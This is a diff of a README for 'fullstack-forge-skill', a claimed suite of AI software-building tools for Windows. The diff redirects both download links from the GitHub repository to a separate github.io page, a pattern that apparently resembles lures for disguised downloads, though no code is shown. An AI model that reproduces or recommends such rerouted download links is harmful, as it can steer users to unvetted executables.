@@ -1,6 +1,6 @@
 # 🛠️ fullstack-forge-skill - Build better software with AI tools
 
-[![Download Fullstack Forge](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/seroneyemmanuel4-afk/fullstack-forge-skill)
+[![Download Fullstack Forge](https://img.shields.io/badge/Download-Application-blue.svg)](https://seroneyemmanuel4-afk.github.io)
 
 Fullstack Forge is a collection of tools for people who build software using AI. It manages the complex tasks of web development so you can focus on your goals. The suite covers everything from user interface design to database security. It helps you build, test, and deploy applications without complex manual setup.
 
@@ -8,7 +8,7 @@ Fullstack Forge is a collection of tools for people who build software using AI.
 
 You need a Windows computer to use this application. This software handles the heavy lifting for your AI coding projects. Follow the steps below to set it up on your machine.
 
-Visit this page to download: [https://github.com/seroneyemmanuel4-afk/fullstack-forge-skill](https://github.com/seroneyemmanuel4-afk/fullstack-forge-skill)
+Visit this page to download: [https://seroneyemmanuel4-afk.github.io](https://seroneyemmanuel4-afk.github.io)
 
 ## 💻 System Requirements
 
